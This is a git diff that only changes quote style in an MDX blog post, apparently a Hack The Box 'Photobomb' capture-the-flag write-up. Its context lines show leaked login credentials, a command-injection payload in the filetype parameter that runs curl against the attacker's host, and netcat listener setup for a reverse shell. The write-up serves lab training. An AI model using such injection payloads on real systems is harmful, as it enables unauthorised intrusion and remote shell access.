@@ -6,8 +6,8 @@ date: 2022-10-10
 image: hackthebox-photobomb-writeup.webp
 ---
 
-import FixTheImageURL from '../../components/mdxComponents/FixTheImageURL.astro';
-import { components as MDXComponents } from '../../components/mdxComponents';
+import FixTheImageURL from "../../components/mdxComponents/FixTheImageURL.astro";
+import { components as MDXComponents } from "../../components/mdxComponents";
 export const components = MDXComponents;
 
 ## Nmap
@@ -49,17 +49,17 @@ Let's quickly add this in our `/etc/hosts` file
 
 There is a simple `HTML` page with a link which going to `/printer` but it's asking for `password` that's we don't know
 
-<FixTheImageURL src='web.png' slug='hackthebox-photobomb-writeup' />
+<FixTheImageURL src="web.png" slug="hackthebox-photobomb-writeup" />
 
-<FixTheImageURL src='web1.png' slug='hackthebox-photobomb-writeup' />
+<FixTheImageURL src="web1.png" slug="hackthebox-photobomb-writeup" />
 
 After that, I view the source code of the website that's include the JS file called `photobomb.js`
 
-<FixTheImageURL src='web2.png' slug='hackthebox-photobomb-writeup' />
+<FixTheImageURL src="web2.png" slug="hackthebox-photobomb-writeup" />
 
 Viewing that file, we got the `username` and `password`
 
-<FixTheImageURL src='web3.png' slug='hackthebox-photobomb-writeup' />
+<FixTheImageURL src="web3.png" slug="hackthebox-photobomb-writeup" />
 
 Now let's try to log in with that `username` and `password`
 
@@ -70,7 +70,7 @@ password = b0Mb!
 
 After login, we see that there is an option to `download` photo to print
 
-<FixTheImageURL src='web4.png' slug='hackthebox-photobomb-writeup' />
+<FixTheImageURL src="web4.png" slug="hackthebox-photobomb-writeup" />
 
 I capture that request in `burp` and try some `command injection` in all parameters
 
@@ -82,11 +82,11 @@ But before that start your `python web server`
 > python3 -m http.server 80
 ```
 
-<FixTheImageURL src='burp.png' slug='hackthebox-photobomb-writeup' />
+<FixTheImageURL src="burp.png" slug="hackthebox-photobomb-writeup" />
 
 This conforms that `photo` and `dimensions` parameter is not vulnerable
 
-<FixTheImageURL src='burp1.png' slug='hackthebox-photobomb-writeup' />
+<FixTheImageURL src="burp1.png" slug="hackthebox-photobomb-writeup" />
 
 ## Command Injection
 
@@ -96,11 +96,11 @@ Let's try with `file` type parameter
 photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png;curl+10.10.XX.XX/dedsec&dimensions=3000x2000
 ```
 
-<FixTheImageURL src='burp2.png' slug='hackthebox-photobomb-writeup' />
+<FixTheImageURL src="burp2.png" slug="hackthebox-photobomb-writeup" />
 
 And we got the hit, it's mean we can get `rev shell` with that
 
-<FixTheImageURL src='cmd.png' slug='hackthebox-photobomb-writeup' />
+<FixTheImageURL src="cmd.png" slug="hackthebox-photobomb-writeup" />
 
 ## RCE
 
@@ -118,11 +118,11 @@ Before that, start your `net cat` listener
 
 It's hanging that `good sign`, let's check the net cat
 
-<FixTheImageURL src='burp3.png' slug='hackthebox-photobomb-writeup' />
+<FixTheImageURL src="burp3.png" slug="hackthebox-photobomb-writeup" />
 
 Boom 🎉 we got the shell as `wizard` user
 
-<FixTheImageURL src='cmd1.png' slug='hackthebox-photobomb-writeup' />
+<FixTheImageURL src="cmd1.png" slug="hackthebox-photobomb-writeup" />
 
 Got the `user.txt`
 
